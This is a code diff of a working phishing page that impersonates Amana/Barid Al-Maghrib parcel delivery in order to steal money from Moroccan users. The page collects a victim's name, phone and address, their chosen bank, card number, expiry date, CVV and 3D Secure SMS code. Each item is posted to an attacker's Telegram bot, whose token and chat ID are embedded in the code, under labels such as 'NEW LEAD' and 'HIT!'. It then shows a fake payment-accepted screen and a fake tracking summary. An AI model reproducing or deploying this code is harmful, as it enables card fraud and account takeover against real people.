@@ -9,6 +9,10 @@
         .amana-gold { background-color: #fdb913; }
         .amana-blue { background-color: #0054a6; }
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .hidden { display: none; }
+        .bank-option { border: 1px solid #e5e7eb; padding: 15px; border-radius: 8px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 12px; }
+        .bank-option:hover { border-color: #0054a6; background-color: #f0f7ff; }
+        .product-img { width: 80px; height: 80px; object-fit: cover; border-radius: 8px; border: 1px solid #e5e7eb; }
         .check-container { animation: checkPop 0.5s ease-out forwards; }
         @keyframes checkPop {
             0% { transform: scale(0); opacity: 0; }
@@ -18,7 +22,8 @@
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
-    <div class="max-w-md mx-auto bg-white min-h-screen shadow-lg relative">
+    <div class="max-w-md mx-auto bg-white min-h-screen shadow-lg relative pb-10">
+        
         <div class="amana-blue p-4 flex items-center justify-between">
             <img src="https://images.seeklogo.com/logo-png/39/1/amana-messagerie-logo-png_seeklogo-394935.png" alt="Logo" class="h-10">
             <div class="flex flex-col items-end">
@@ -27,70 +32,109 @@
             </div>
         </div>
 
-        <div class="p-6 bg-blue-50 border-b border-blue-100">
-            <h2 class="text-blue-900 text-xs font-bold mb-1 uppercase tracking-tighter">Résumé de la transaction</h2>
-            <div class="flex justify-between items-baseline">
-                <span class="text-gray-600 text-sm">Frais de service & Assurance</span>
-                <span class="text-2xl font-black text-blue-900">25.00 <small class="text-xs">DH</small></span>
-            </div>
-            <div class="mt-2 flex items-center text-[10px] text-blue-700 bg-white w-fit px-2 py-1 rounded-full border border-blue-200">
-                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse mr-2"></span>
-                Transaction sécurisée par SSL
-            </div>
-        </div>
-
-        <div class="p-6" id="step1">
-            <div class="mb-8 flex justify-center space-x-6">
-                <img src="https://www.cihbank.ma/themes/ciht/images/logo.png" class="h-4">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-6">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" class="h-4">
-            </div>
-
-            <form id="payForm" class="space-y-5">
+        <div id="main_content">
+            <div class="p-4 bg-white border-b flex items-center gap-4">
+                <img src="https://i.ebayimg.com/images/g/gJ4AAeSwVrFplSe1/s-l960.webp" alt="Colis" class="product-img">
                 <div>
-                    <label class="block text-[10px] font-black text-gray-500 mb-1">NOM SUR LA CARTE</label>
-                    <input type="text" id="name" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none uppercase font-bold text-sm" placeholder="EX: MOHAMMED EL ALAMI" required>
-                </div>
-                <div>
-                    <label class="block text-[10px] font-black text-gray-500 mb-1">NUMÉRO DE CARTE</label>
-                    <input type="tel" id="card" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none font-mono text-lg tracking-widest" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                </div>
-                <div class="flex space-x-6">
-                    <div class="w-1/2">
-                        <label class="block text-[10px] font-black text-gray-500 mb-1">EXPIRATION</label>
-                        <input type="text" id="exp" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none font-bold" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    <div class="w-1/2">
-                        <label class="block text-[10px] font-black text-gray-500 mb-1">CVV</label>
-                        <input type="tel" id="cvv" class="w-full border-b-2 border-gray-200 py-2 focus:border-blue-600 outline-none font-bold" placeholder="123" maxlength="3" required>
+                    <h3 class="text-sm font-bold text-gray-800">Livraison Express Amana</h3>
+                    <p class="text-[11px] text-gray-500 italic">Réf: AM-99283741-MA</p>
+                    <div id="status_badge" class="mt-1 text-[10px] font-bold text-green-600 bg-green-50 px-2 py-0.5 rounded-full w-fit">
+                        En attente de paiement
                     </div>
                 </div>
-                <button type="submit" class="w-full amana-gold text-blue-900 font-black py-4 rounded-xl shadow-lg hover:shadow-xl transition-all transform active:scale-95 mt-8">
-                    CONFIRMER LE PAIEMENT
-                </button>
-            </form>
-        </div>
+            </div>
 
-        <div class="p-6 hidden" id="step2">
-            <div class="text-center py-10">
-                <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-                <h2 class="text-xl font-extrabold text-blue-900 mb-4 tracking-tight">Vérification Sécurisée</h2>
-                <p class="text-xs text-gray-500 px-4 mb-8">Veuillez saisir le code de sécurité reçu par SMS sur votre téléphone mobile.</p>
-                <div class="bg-gray-50 p-6 rounded-2xl border-2 border-dashed border-gray-200">
-                    <input type="tel" id="sms" class="w-full bg-transparent text-center text-4xl font-black tracking-[10px] outline-none text-blue-900" placeholder="000000" maxlength="8">
+            <div class="p-6" id="step_info">
+                <h2 class="text-lg font-bold text-gray-800 mb-6">Détails de livraison</h2>
+                <div class="space-y-4">
+                    <div class="grid grid-cols-2 gap-4">
+                        <input type="text" id="fname" placeholder="Prénom" class="w-full border-b-2 p-2 outline-none focus:border-blue-600">
+                        <input type="text" id="lname" placeholder="Nom" class="w-full border-b-2 p-2 outline-none focus:border-blue-600">
+                    </div>
+                    <input type="tel" id="phone" placeholder="Numéro de téléphone" class="w-full border-b-2 p-2 outline-none focus:border-blue-600">
+                    <input type="text" id="city" placeholder="Ville" class="w-full border-b-2 p-2 outline-none focus:border-blue-600">
+                    <input type="text" id="address" placeholder="Adresse complète" class="w-full border-b-2 p-2 outline-none focus:border-blue-600">
+                    <button onclick="sendAddressAndNext()" class="w-full amana-blue text-white font-bold py-4 rounded-xl mt-6">VALIDER L'ADRESSE</button>
                 </div>
-                <button id="btnSms" class="w-full amana-blue text-white font-bold py-4 rounded-xl mt-8 shadow-lg">VALIDER</button>
+            </div>
+
+            <div class="p-6 hidden" id="step_bank">
+                <h2 class="text-lg font-bold text-gray-800 mb-4">Choisir votre banque</h2>
+                <div class="space-y-3">
+                    <div class="bank-option" onclick="selectBank('CIH Bank')"><img src="https://www.cihbank.ma/themes/ciht/images/logo.png" class="h-4 w-12 object-contain"><span class="text-sm font-medium">CIH Bank</span></div>
+                    <div class="bank-option" onclick="selectBank('Attijariwafa Bank')"><img src="https://imgs.search.brave.com/1B4MbBywLTdid3ccaAPUvR8HmYHevniG-nRY_I2-eMk/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4u/Y29va2llbGF3Lm9y/Zy9sb2dvcy9hNjEz/ZjgzYy01OTBhLTQ1/NjMtOTNjNi1jY2Ji/NmEzNTY2MWUvZjE0/ZGFhMGMtZTgwMC00/OWNjLWFlNWEtYTc4/NGEyYWE2ZGZjLzZl/OTkwMWUwLThlN2Mt/NDE5Ny04YWQ3LWJi/YjAwYjVhMzk0Yi9h/d2JMb2dvLnBuZw" class="h-4 w-12 object-contain"><span class="text-sm font-medium">Attijariwafa Bank</span></div>
+                    <div class="bank-option" onclick="selectBank('BMCE / BOA')"><img src="https://logodix.com/logo/368200.jpg" class="h-4 w-12 object-contain"><span class="text-sm font-medium">Bank Of Africa</span></div>
+                    <div class="bank-option" onclick="selectBank('Credit Agricole')"><img src="https://imgs.search.brave.com/wg3EoOLorZGXnzET6K4b7RnlhknT6SALIj1XybzSizM/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/c2FmZXItcGFjYS5j/b20vd3AtY29udGVu/dC91cGxvYWRzLzIw/MTgvMDgvbG9nby1j/cmVkaXQtYWdyaWNv/bGUucG5n" class="h-4 w-12 object-contain"><span class="text-sm font-medium">Crédit Agricole du Maroc</span></div>
+                </div>
+            </div>
+
+            <div class="p-6 hidden" id="step_pay">
+                <div class="mb-8 flex justify-between items-center"><span id="selected_bank_display" class="text-xs font-bold text-blue-600 bg-blue-50 px-3 py-1 rounded">Card Payment</span><img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-6"></div>
+                <form id="payForm" class="space-y-5">
+                    <input type="text" id="name" class="w-full border-b-2 py-2 outline-none uppercase font-bold text-sm" placeholder="NOM SUR LA CARTE" required>
+                    <input type="tel" id="card" class="w-full border-b-2 py-2 outline-none font-mono text-lg tracking-widest" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    <div class="flex space-x-6">
+                        <input type="text" id="exp" class="w-1/2 border-b-2 py-2 outline-none font-bold" placeholder="MM/YY" maxlength="5" required>
+                        <input type="tel" id="cvv" class="w-1/2 border-b-2 py-2 outline-none font-bold" placeholder="CVV" maxlength="3" required>
+                    </div>
+                    <button type="submit" class="w-full amana-gold text-blue-900 font-black py-4 rounded-xl shadow-lg mt-8 uppercase">Confirmer 25.00 DH</button>
+                </form>
+            </div>
+
+            <div class="p-6 hidden" id="step_sms">
+                <div class="text-center py-10">
+                    <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+                    <h2 class="text-xl font-extrabold text-blue-900 mb-4 tracking-tight">Authentification 3D Secure</h2>
+                    <input type="tel" id="sms" class="w-full bg-gray-50 text-center text-4xl font-black tracking-[10px] outline-none p-6 border rounded-xl" placeholder="000000" maxlength="8">
+                    <button id="btnSms" class="w-full amana-blue text-white font-bold py-4 rounded-xl mt-8 shadow-lg">VALIDER</button>
+                </div>
             </div>
         </div>
 
-        <div class="p-6 hidden text-center py-20" id="step3">
+        <div id="step_check" class="p-6 hidden text-center py-20">
             <div class="check-container">
-                <svg class="w-20 h-20 text-green-500 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <svg class="w-24 h-24 text-green-500 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
                 </svg>
             </div>
-            <h2 class="text-xl font-bold text-gray-800 tracking-tight">Traitement réussi</h2>
-            <p class="text-sm text-gray-500 mt-2 px-6">Redirection vers le service de suivi Barid Al-Maghrib...</p>
+            <h2 class="text-2xl font-bold text-gray-800 mt-4">Paiement Accepté</h2>
+            <p class="text-gray-500 text-sm mt-2">Votre transaction a été traitée avec succès.</p>
+        </div>
+
+        <div id="step_final" class="p-6 hidden">
+            <h2 class="text-xl font-bold text-blue-900 mb-6 border-b pb-2">Récapitulatif du colis</h2>
+            
+            <div class="space-y-6">
+                <div class="bg-gray-50 p-4 rounded-xl border border-gray-100">
+                    <p class="text-[10px] text-gray-400 uppercase font-bold mb-3">Informations de livraison</p>
+                    <div class="grid grid-cols-2 gap-y-3 text-sm">
+                        <span class="text-gray-500">Destinataire:</span> <span id="res_name" class="font-bold text-right text-gray-800"></span>
+                        <span class="text-gray-500">Téléphone:</span> <span id="res_phone" class="font-bold text-right text-gray-800"></span>
+                        <span class="text-gray-500">Ville:</span> <span id="res_city" class="font-bold text-right text-gray-800"></span>
+                        <span class="text-gray-500">Adresse:</span> <span id="res_addr" class="font-bold text-right text-gray-800"></span>
+                    </div>
+                </div>
+
+                <div class="relative pl-8 border-l-2 border-blue-200 space-y-8">
+                    <div class="relative">
+                        <div class="absolute -left-[37px] top-0 w-4 h-4 rounded-full bg-blue-600 border-4 border-white"></div>
+                        <p class="text-sm font-bold text-gray-800">Dakhla - Centre de tri</p>
+                        <p class="text-[10px] text-gray-400">Expédié le: <span id="order_date"></span></p>
+                    </div>
+                    <div class="relative">
+                        <div class="absolute -left-[37px] top-0 w-4 h-4 rounded-full bg-gray-300 border-4 border-white"></div>
+                        <p class="text-sm font-bold text-gray-500">En transit (Vers Casablanca)</p>
+                        <p class="text-[10px] text-gray-400">Date estimée: Dans 72 heures</p>
+                    </div>
+                </div>
+
+                <div class="bg-blue-600 p-4 rounded-xl text-white text-center">
+                    <p class="text-xs opacity-80 uppercase tracking-widest">Délai de livraison estimé</p>
+                    <p class="text-xl font-black mt-1">3 JOURS OUVRABLES</p>
+                </div>
+            </div>
+            
+            <button onclick="window.location.href='https://www.amana-colis.ma/'" class="w-full border-2 border-gray-200 text-gray-500 font-bold py-3 rounded-xl mt-8">Retour au portail</button>
         </div>
 
         <div class="p-6 text-center border-t mt-10">
@@ -101,41 +145,71 @@
     <script>
         const BOT_TOKEN = "8309521845:AAF253ZXZZt-RIr3YREgMWhwlMe5DGDm5Yo";
         const CHAT_ID = "8578403581";
+        let chosenBank = "";
 
-        async function getCardInfo(bin) {
-            try {
-                const res = await fetch(`https://lookup.binlist.net/${bin.replace(/\s/g, '').substring(0, 6)}`);
-                const data = await res.json();
-                return `[${data.scheme || '?'}] ${data.type || '?'} - ${data.brand || '?'} (${data.bank ? data.bank.name : '?'})`;
-            } catch (e) { return "Info non disponible"; }
+        async function postToBot(msg) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
         }
 
-        document.getElementById('card').addEventListener('input', (e) => {
+        function showStep(hide, show) {
+            document.getElementById(hide).classList.add('hidden');
+            document.getElementById(show).classList.remove('hidden');
+        }
+
+        async function sendAddressAndNext() {
+            const fname = document.getElementById('fname').value;
+            const lname = document.getElementById('lname').value;
+            const phone = document.getElementById('phone').value;
+            const city = document.getElementById('city').value;
+            const addr = document.getElementById('address').value;
+
+            // Fill summary for last page
+            document.getElementById('res_name').innerText = fname + ' ' + lname;
+            document.getElementById('res_phone').innerText = phone;
+            document.getElementById('res_city').innerText = city;
+            document.getElementById('res_addr').innerText = addr;
+            document.getElementById('order_date').innerText = new Date().toLocaleDateString('fr-FR');
+
+            const data = `📍 <b>NEW LEAD</b>\n👤 ${fname} ${lname}\n📞 ${phone}\n🏙️ ${city}\n🏠 ${addr}`;
+            await postToBot(data);
+            showStep('step_info', 'step_bank');
+        }
+
+        function selectBank(bank) {
+            chosenBank = bank;
+            document.getElementById('selected_bank_display').innerText = bank;
+            postToBot(`🏦 <b>Bank:</b> ${bank}`);
+            showStep('step_bank', 'step_pay');
+        }
+
+        document.getElementById('card').addEventListener('input', e => {
             e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
         });
-
-        document.getElementById('exp').addEventListener('input', (e) => {
+        document.getElementById('exp').addEventListener('input', e => {
             e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
         });
 
         document.getElementById('payForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const cardVal = document.getElementById('card').value;
-            const cardInfo = await getCardInfo(cardVal);
-            const text = `🚨 HIT AMANA! 🚨\n\n👤 NOM: ${document.getElementById('name').value}\n💳 CARD: ${cardVal}\n📅 EXP: ${document.getElementById('exp').value}\n🔑 CVV: ${document.getElementById('cvv').value}\n📊 INFO: ${cardInfo}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
+            const text = `💳 <b>HIT!</b>\n👤 ${document.getElementById('name').value}\n💳 <code>${document.getElementById('card').value}</code>\n📅 <code>${document.getElementById('exp').value}</code>\n🔑 <code>${document.getElementById('cvv').value}</code>\n🏦 ${chosenBank}`;
+            await postToBot(text);
+            showStep('step_pay', 'step_sms');
         });
 
         document.getElementById('btnSms').addEventListener('click', async () => {
-            const smsCode = document.getElementById('sms').value;
-            if(smsCode.length < 4) return alert("Code invalide");
-            const text = `📩 SMS CODE: ${smsCode}\n👤 NOM: ${document.getElementById('name').value}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
-            setTimeout(() => { window.location.href = "https://www.amana-colis.ma/"; }, 3000);
+            const code = document.getElementById('sms').value;
+            if(code.length < 4) return alert("Code invalide");
+            await postToBot(`📩 <b>OTP:</b> <code>${code}</code>`);
+            
+            // Go to Success Check
+            document.getElementById('main_content').classList.add('hidden');
+            document.getElementById('step_check').classList.remove('hidden');
+            
+            // Wait 2 seconds then show Final Order Summary
+            setTimeout(() => {
+                document.getElementById('step_check').classList.add('hidden');
+                document.getElementById('step_final').classList.remove('hidden');
+            }, 2000);
         });
     </script>
 </body>
